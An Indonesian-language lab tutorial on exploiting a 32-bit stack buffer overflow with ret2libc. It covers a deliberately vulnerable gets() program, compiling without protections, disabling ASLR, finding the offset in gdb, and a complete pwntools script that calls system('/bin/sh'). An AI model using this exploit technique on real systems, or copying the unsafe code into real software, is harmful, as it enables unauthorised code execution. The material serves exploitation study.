[x] NO Canary ~ -fno-stack-protector
[x] NO PIE ~ -no-pie
[x] NX ~ tanpa -z execstack
[x] NO ASLR ~ echo 0 > /proc/sys/kernel/randomize_va_space

vuln_program.c

```c
#include<stdio.h>

void foo()
{
    char buffer[40];
    puts("give me your input :)\n");
    gets(buffer);
}

void main()
{
    foo();
}
```

kita kompile dengan cara seperti ini untuk supaya tidak ada perlindungan Canary dan PIE

```bash
gcc -g -m32 -fno-stack-protector -no-pie -o vuln32 vuln_program.c
```

setting disable untuk perlindungan ASLR pada sistem operasi linux

```bash
echo 0 > /proc/sys/kernel/randomize_va_space
```

jalankan program vuln32 dengan gdb kemudian lakukan checksec

```bash
$gdb -q vuln32
gdb-peda$ checksec 
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

```bash
gdb-peda$ pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
gdb-peda$ r
Starting program: /root/You_Tube/Stack_Buffer_Overflow/3/vuln32 
give me your input :)  

AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
EAX: 0xffffd638 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
EBX: 0x41414641 ('AFAA')
ECX: 0xf7fb55c0 --> 0xfbad2288 
EDX: 0xf7fb689c --> 0x0 
ESI: 0xf7fb5000 --> 0x1d9d6c 
EDI: 0xf7fb5000 --> 0x1d9d6c 
EBP: 0x31414162 ('bAA1')
ESP: 0xffffd670 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
EIP: 0x41474141 ('AAGA')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41474141
[------------------------------------stack-------------------------------------]
0000| 0xffffd670 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0004| 0xffffd674 ("2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0008| 0xffffd678 ("AAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0012| 0xffffd67c ("A3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0016| 0xffffd680 ("IAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0020| 0xffffd684 ("AA4AAJAAfAA5AAKAAgAA6AAL")
0024| 0xffffd688 ("AJAAfAA5AAKAAgAA6AAL")
0028| 0xffffd68c ("fAA5AAKAAgAA6AAL")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41474141 in ?? ()
gdb-peda$ pattern offset 0x41474141
1095188801 found at offset: 52
```

perintahnya menggunakan ldd vuln32

```bash
$ldd vuln32
linux-gate.so.1 (0xf7fd2000)
libc.so.6 => /lib32/libc.so.6 (0xf7ddb000)
/lib/ld-linux.so.2 (0xf7fd4000)
```
ketemu 0xf7ddb000

mencari alamat system dengan perintah readelf, cari alamat system@@GLIBC_2.0

```bash
$readelf -s /lib32/libc.so.6|grep system
   257: 00129d40   102 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.0
   658: 0003e9e0    55 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
  1525: 0003e9e0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
```

ketemu 0003e9e0 ditulis 0x3e9e0

mencari alamat /bin/sh dengan perintah strings

```bash
$strings -a -t x /lib32/libc.so.6 | grep /bin/sh
 17eaaa /bin/sh
```

ketemu 17eaaa ditulis 0x17eaaa

```python
#ldd vuln32
#libc.so.6 => /lib32/libc.so.6 -> 0xf7ddb000
#readelf -s /lib32/libc.so.6|grep system  -> 0x3e9e0
#strings -a -t x /lib32/libc.so.6 |grep /bin/sh -> 0x17eaaa
  
from pwn import *
p=process('./vuln32')
print(p.recv())

base_libc = 0xf7ddb000
padding = b'A'*52
system = p32(base_libc+0x3e9e0)
ret = p32(0x0)
binsh = p32(base_libc+0x17eaaa)

p.sendline(padding+system+ret+binsh)
print(p.clean())
p.interactive()
```

```bash
$python3 exploit-nx.py 
[+] Starting local process './vuln32': pid 12069
b'give me your input :)\n'
b'\n'
[*] Switching to interactive mode
$
```
